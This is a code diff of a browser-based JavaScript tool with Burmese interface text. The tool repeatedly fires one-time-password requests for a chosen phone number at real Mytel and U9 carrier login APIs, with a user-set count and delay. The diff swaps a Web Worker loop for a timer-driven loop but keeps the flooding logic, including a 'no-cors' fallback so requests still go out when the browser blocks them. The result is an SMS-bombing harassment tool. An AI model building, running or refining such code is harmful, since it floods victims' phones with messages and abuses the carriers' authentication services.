@@ -615,7 +615,7 @@ function toggleMusic(event) {
 }
 
 /* ============================================================
-   MAIN UI LOGIC
+   MAIN UI LOGIC (No Worker, Fully Synchronous)
    ============================================================ */
 setTimeout(() => document.getElementById('boot').classList.add('gone'), 1400);
 
@@ -681,7 +681,8 @@ setTimeout(() => document.getElementById('boot').classList.add('gone'), 1400);
   tick();
 })();
 
-let worker = null;
+let isRunning = false;
+let timeoutId = null;
 let currentOp = 'auto';
 let success = 0, fail = 0, dispatched = 0;
 let sessionTotal = 0, sessionDelay = 0, sessionStart = 0;
@@ -826,45 +827,9 @@ function validate() {
   return { phone, count, delay };
 }
 
-const workerCode = `
-self.onmessage = async (e) => {
-  const { phone, count, delay, operator } = e.data;
-  function getOp(p) {
-    const c = String(p).replace(/[^\\d+]/g, '');
-    return (c.startsWith('096') || c.startsWith('96') || c.startsWith('9596')) ? 'mytel' : 'u9';
-  }
-  for (let i = 1; i <= count; i++) {
-    const op = operator === 'auto' ? getOp(phone) : operator;
-    self.postMessage({ type: 'attempt', idx: i, op: op.toUpperCase() });
-    let url, init;
-    if (op === 'mytel') {
-      url = 'https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=' + encodeURIComponent(phone);
-      init = { method: 'GET', cache: 'no-store' };
-    } else {
-      url = 'https://ecareappga.u9.com.mm/u9selfcareapi12.0/api/Authentication/SendOTP';
-      init = { method: 'POST', cache: 'no-store', body: JSON.stringify({ phoneNumber: phone }), headers: { 'Content-Type': 'application/json' } };
-    }
-    
-    try {
-      const res = await fetch(url, Object.assign({}, init, { mode: 'cors' }));
-      self.postMessage({ type: 'success', idx: i, op: op.toUpperCase(), transport: 'cors', http: res.status });
-    } catch (err) {
-      try {
-        await fetch(url, Object.assign({}, init, { mode: 'no-cors' }));
-        self.postMessage({ type: 'success', idx: i, op: op.toUpperCase(), transport: 'opaque', http: 0 });
-      } catch (err2) {
-        self.postMessage({ type: 'fail', idx: i, op: op.toUpperCase(), err: 'Network Error' });
-      }
-    }
-    if (i < count) await new Promise(r => setTimeout(r, Math.max(0, delay * 1000)));
-  }
-  self.postMessage({ type: 'done' });
-};
-`;
-
 function startAutomation(event) {
   if (event) event.preventDefault();
-  if (worker) return;
+  if (isRunning) return;
   
   const v = validate();
   if (v.err) { logMsg(v.err, 'error'); return; }
@@ -879,57 +844,88 @@ function startAutomation(event) {
   if (etaTimer) clearInterval(etaTimer);
   etaTimer = setInterval(tickEta, 500);
 
+  isRunning = true;
   updateUI(true);
 
   const op = currentOp === 'auto' ? detectOp(v.phone) : currentOp;
   logMsg(`Sequence စတင်နေပါပြီ [${op.toUpperCase()}] → ${v.phone}`, 'sys');
 
-  const blob = new Blob([workerCode], { type: 'application/javascript' });
-  const url = URL.createObjectURL(blob);
-  worker = new Worker(url);
-  URL.revokeObjectURL(url);
+  let currentIdx = 1;
 
-  worker.postMessage({ phone: v.phone, count: v.count, delay: v.delay, operator: currentOp });
-
-  worker.onmessage = (e) => {
-    const d = e.data;
-    if (d.type === 'attempt') {
-      logMsg(`Node #${d.idx} | ${d.op} | ပို့ဆောင်နေပါသည်...`, 'info', d.idx);
-    } else if (d.type === 'success') {
+  async function fireRequest() {
+    if (!isRunning || currentIdx > v.count) return;
+    
+    const i = currentIdx;
+    const actualOp = currentOp === 'auto' ? detectOp(v.phone) : currentOp;
+    
+    logMsg(`Node #${i} | ${actualOp.toUpperCase()} | ပို့ဆောင်နေပါသည်...`, 'info', i);
+    
+    let url, init;
+    if (actualOp === 'mytel') {
+      url = 'https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=' + encodeURIComponent(v.phone);
+      init = { method: 'GET', cache: 'no-store' };
+    } else {
+      url = 'https://ecareappga.u9.com.mm/u9selfcareapi12.0/api/Authentication/SendOTP';
+      init = { method: 'POST', cache: 'no-store', body: JSON.stringify({ phoneNumber: v.phone }), headers: { 'Content-Type': 'application/json' } };
+    }
+    
+    let resObj = { transport: 'fail', status: -1 };
+    
+    try {
+      const res = await fetch(url, Object.assign({}, init, { mode: 'cors' }));
+      resObj = { transport: 'cors', status: res.status };
+    } catch (e) {
+      try {
+        await fetch(url, Object.assign({}, init, { mode: 'no-cors' }));
+        resObj = { transport: 'opaque', status: 0 };
+      } catch (e2) {
+        resObj = { transport: 'fail', status: -1 };
+      }
+    }
+    
+    if (!isRunning) return;
+    
+    if (resObj.transport !== 'fail') {
       success++; dispatched++;
       const el = document.getElementById('successCount');
       animateNumber(el, success - 1, success);
       bump(el);
-      
-      const tag = d.transport === 'cors' ? `HTTP ${d.http}` : `Opaque (Sent)`;
-      logMsg(`Node #${d.idx} | ${d.op} | အောင်မြင်ပါသည် (${tag})`, 'success', d.idx);
-      
-      updateProgress(); tickEta();
-    } else if (d.type === 'fail') {
+      const tag = resObj.transport === 'cors' ? `HTTP ${resObj.status}` : `Opaque (Sent)`;
+      logMsg(`Node #${i} | ${actualOp.toUpperCase()} | အောင်မြင်ပါသည် (${tag})`, 'success', i);
+    } else {
       fail++; dispatched++;
       const el = document.getElementById('failCount');
       animateNumber(el, fail - 1, fail);
       bump(el);
-      logMsg(`Node #${d.idx} | ${d.op} | မအောင်မြင်ပါ (${d.err})`, 'error', d.idx);
-      updateProgress(); tickEta();
-    } else if (d.type === 'done') {
-      stopAutomation();
+      logMsg(`Node #${i} | ${actualOp.toUpperCase()} | မအောင်မြင်ပါ (Network)`, 'error', i);
+    }
+    
+    updateProgress(); tickEta();
+    
+    currentIdx++;
+    if (currentIdx <= v.count) {
+      timeoutId = setTimeout(fireRequest, Math.max(0, v.delay * 1000));
+    } else {
+      isRunning = false;
+      updateUI(false);
+      updateProgress();
       logMsg(`ပို့ဆောင်မှု ပြီးစီးပါပြီ။ စုစုပေါင်း ${success + fail} (${success} အောင်မြင် / ${fail} မအောင်မြင်)`, 'sys');
     }
-  };
-
-  worker.onerror = (err) => {
-    logMsg(`Worker Error ဖြစ်ပေါ်နေပါသည်။`, 'error');
-    stopAutomation();
-  };
+  }
+  
+  fireRequest();
 }
 
 function stopAutomation(event) {
   if (event) event.preventDefault();
-  if (worker) { try { worker.terminate(); } catch (e) {} worker = null; }
+  if (!isRunning) return;
+  
+  isRunning = false;
+  if (timeoutId) { clearTimeout(timeoutId); timeoutId = null; }
   if (etaTimer) { clearInterval(etaTimer); etaTimer = null; }
   updateUI(false);
   updateProgress();
+  
   if (dispatched > 0) logMsg('Sequence ကို ရပ်တန့်လိုက်ပါပြီ။', 'sys');
   else logMsg('မစတင်မီ ရပ်တန့်လိုက်ပါပြီ။', 'sys');
 }
